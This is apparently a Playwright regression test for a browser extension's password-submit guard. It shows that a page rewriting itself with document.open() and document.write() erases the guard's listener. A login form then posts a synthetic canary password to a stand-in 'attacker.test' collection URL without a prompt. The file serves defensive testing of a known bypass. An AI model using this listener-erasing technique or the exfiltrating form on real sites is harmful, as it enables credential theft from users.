/**
 * #1105: does a page that rewrites its own document with
 * `document.open(); document.write(<login form>); document.close()` strip the
 * credential guard's submit listener, so a password POST to a new host is no
 * longer intercepted?
 *
 * The HTML spec's "document open steps" erase every event listener on the
 * document, its descendants and the window, and the guard registers its
 * `submit` listener at document_start, before any page script can call
 * `document.open()`. Both hosts are fake and served by request interception, so
 * every POST is counted at the network boundary.
 */
import { chromium, expect, test, type BrowserContext, type Page, type Worker } from "@playwright/test";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { SUITE_SETTINGS_KEY } from "../../extension/src/shared/storage";
import { clickModalButton, getServiceWorker, waitForCredentialModal } from "./extension_test_utils";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const extensionPath = process.env.EXTENSION_PATH
  ? path.resolve(process.env.EXTENSION_PATH)
  : path.resolve(__dirname, "..", "..", "extension", "dist");

const LOGIN_URL = "http://victim.test/login";
const ATTACKER_URL = "http://attacker.test/collect";
const CANARY = "canary-password-1105";

test.setTimeout(120_000);

const LOGIN_FORM = `<form id="login" method="post" action="${ATTACKER_URL}">
  <input name="user" value="synthetic@example.invalid">
  <input id="password" name="password" type="password" value="${CANARY}">
  <button id="go" type="submit">Sign in</button>
</form>`;

async function withVictimPage(run: (page: Page, attacker: string[]) => Promise<void>): Promise<void> {
  const userDataDir = fs.mkdtempSync(path.join(os.tmpdir(), "navsentinel-cred-docopen-"));
  let context: BrowserContext | null = null;
  try {
    context = await chromium.launchPersistentContext(userDataDir, {
      headless: false,
      timeout: 60_000,
      args: [`--disable-extensions-except=${extensionPath}`, `--load-extension=${extensionPath}`],
    });
    const serviceWorker: Worker = await getServiceWorker(context);
    await expect.poll(() => serviceWorker.evaluate(() => typeof chrome.storage?.local?.set === "function")).toBe(true);
    await serviceWorker.evaluate(async (settingsKey) => {
      await chrome.storage.local.set({
        [settingsKey]: {
          nav: { defaultMode: "smart", debug: false },
          credential: {
            mode: "smart",
            promptOnUntrustedDomain: true,
            promptOnMediumRisk: false,
            mediumRiskThreshold: 100,
            blockHttpPasswordSubmit: false,
            warnOnPaste: false,
            similarity: { enabled: true, maxDistance: 2 },
          },
          logLimit: 300,
        },
      });
    }, SUITE_SETTINGS_KEY);

    const attacker: string[] = [];
    await context.route("http://victim.test/**", (route) =>
      route.fulfill({ contentType: "text/html", body: "<!doctype html><html><body></body></html>" }),
    );
    await context.route("http://attacker.test/**", async (route) => {
      const request = route.request();
      attacker.push(`${request.method()} ${request.url()} ${request.postData() ?? ""}`);
      await route.fulfill({ contentType: "text/html", body: "<p>attacker sink</p>" });
    });

    const page = await context.newPage();
    await page.goto(LOGIN_URL, { waitUntil: "domcontentloaded" });
    // The guard is a document_start content script; let its settings cache prime.
    await page.waitForTimeout(300);
    await run(page, attacker);
  } finally {
    await context?.close();
    fs.rmSync(userDataDir, { recursive: true, force: true });
  }
}

async function expectGuardIntercepts(page: Page, attacker: string[]): Promise<void> {
  await page.click("#go", { noWaitAfter: true });
  await waitForCredentialModal(page);
  await page.waitForTimeout(1_000);
  expect(attacker, "no canary POST before the user decides").toEqual([]);
  await clickModalButton(page, "Cancel");
  await page.waitForTimeout(1_000);
  expect(attacker, "declining sends nothing").toEqual([]);
}

test("control: a login form injected without document.open() is intercepted (#1105) @regression", async () => {
  test.skip(!fs.existsSync(extensionPath), "Build the extension before running e2e tests.");
  await withVictimPage(async (page, attacker) => {
    await page.evaluate((html) => {
      document.body.innerHTML = html;
    }, LOGIN_FORM);
    await expectGuardIntercepts(page, attacker);
  });
});

test("document.open() + write(login form) + close() currently BYPASSES the credential guard (#1105) @regression", async () => {
  test.skip(!fs.existsSync(extensionPath), "Build the extension before running e2e tests.");
  // Measured (Chromium, #1105): document.open() erases the guard's document
  // listener, so the form written afterwards POSTs the canary to the attacker
  // with no prompt. The same holds for the window-capture listener on #1100.
  // Flip (remove test.fail) when the guard re-registers after document.open().
  test.fail();
  await withVictimPage(async (page, attacker) => {
    await page.evaluate((html) => {
      document.open();
      document.write(`<!doctype html><html><body>${html}</body></html>`);
      document.close();
    }, LOGIN_FORM);
    await expect(page.locator("#go")).toBeVisible();
    await expectGuardIntercepts(page, attacker);
  });
});
